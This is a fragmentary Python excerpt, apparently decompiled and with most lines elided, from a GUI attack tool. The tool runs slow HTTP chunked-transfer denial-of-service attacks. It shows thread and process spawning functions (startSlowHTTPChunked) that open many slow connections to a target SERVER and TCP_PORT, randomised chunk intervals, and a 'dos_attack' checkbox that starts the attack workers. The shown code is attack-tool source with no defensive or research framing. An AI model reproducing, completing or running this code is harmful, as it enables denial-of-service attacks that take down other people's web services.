            ...
            if not exit[id]:
                try:
                    ...
                    if CHUNKS_INTERVAL == 0:
                        CHUNKS_INTERVAL = random.uniform(1.0, 1.19)
                    if debug_mode == True:
...
def startSlowHTTPChunked(p, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size):
    ...
    while 1:
        with lockCnt:
            try:
                if len(exit) < THREADS:
                    threading.Thread(target=startSlowHTTPChunkedThrd, args=(p, cnt, SERVER, TCP_PORT,
                     THREADS, FILE, HOST, KA,
                     THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE,
                     CHUNKS_INTERVAL, verbose_mode, headers, body,
                     chunk_size)).start()
...
class onLoad(gui.MainFrame):
    ...
    def start_check(self, event):
        ...
        if self.dos_attack.GetValue() == True:
            ...
            while p < processes:
                try:
                    service = multiprocessing.Process(name='startSlowHTTPChunked', target=startSlowHTTPChunked, args=(
                     p,
                     SERVER,
                     TCP_PORT,
                     THREADS,
    ...
    def SetFontStyle(self, fontColor=None, fontBgColor=None, fontFace=None, fontSize=None, fontBold=None, fontItalic=None, fontUnderline=None):
        if fontColor:
